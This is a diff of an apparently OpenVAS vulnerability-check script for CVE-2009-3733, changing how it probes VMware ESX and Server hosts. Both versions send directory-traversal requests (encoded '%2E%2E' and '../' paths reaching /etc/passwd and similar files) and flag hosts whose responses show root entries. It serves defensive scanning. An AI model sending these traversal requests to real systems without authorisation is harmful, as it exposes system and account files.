@@ -26,8 +26,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100502");
-  script_version("2019-04-30T06:12:35+0000");
-  script_tag(name:"last_modification", value:"2019-04-30 06:12:35 +0000 (Tue, 30 Apr 2019)");
+  script_version("2019-05-13T14:05:09+0000");
+  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
   script_tag(name:"creation_date", value:"2010-02-23 17:05:07 +0100 (Tue, 23 Feb 2010)");
   script_bugtraq_id(36842);
   script_cve_id("CVE-2009-3733");
@@ -71,45 +71,50 @@ if(description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:8222);
 res = http_get_cache(item:"/", port:port);
 
 # URL based on whether the target is esx/esxi or server
 if("VMware ESX" >< res) {
-  path = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd";
-}
-else if("<title>VMware Server" >< res) {
-  path = "/sdk/../../../../../../etc/passwd";
-}
-else {
+  path = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/";
+} else if("<title>VMware Server" >< res) {
+  path = "/sdk/../../../../../../";
+} else {
   exit(0); # not vmware
-}
-
-req = http_get(item:"/ui/", port:port);
-buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-if(!buf) exit(0);
-
-if("Location: https://" >< buf) { # port is redirected...
-  port_match = eregmatch(pattern:"Location: https://.*:([0-9.]+)/ui/", string:buf);
-  if(isnull(port_match[1]))exit(0);
-  port = port_match[1];
-  if(!get_port_state(port))exit(0);
 }
 
 host = http_host_name(port:port);
 
-req  = string("GET ", path, " HTTP/1.1\r\n");
-req += string("TE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\n");
-req += string("Host: ", host, "\r\n\r\n");
-
-buf = http_send_recv(port:port, data:req);
-if(isnull(buf)) exit(0);
-
-if(egrep(pattern:"root:.*:0:[01]:.*", string:buf)) {
-  report = report_vuln_url(port:port, url:path);
-  security_message(port:port, data:report);
+req = http_get(item:"/ui/", port:port);
+buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+if(!buf)
   exit(0);
+
+if("Location: https://" >< buf) # port is redirected, will be checked if the https port is touched...
+  exit(0);
+
+files = traversal_files("linux");
+
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  url  = path + file;
+  req  = string("GET ", url, " HTTP/1.1\r\n");
+  req += string("TE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\n");
+  req += string("Host: ", host, "\r\n\r\n");
+
+  buf = http_send_recv(port:port, data:req);
+  if(!buf)
+    continue;
+
+  if(egrep(pattern:pattern, string:buf)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
+    exit(0);
+  }
 }
 
 exit(99);
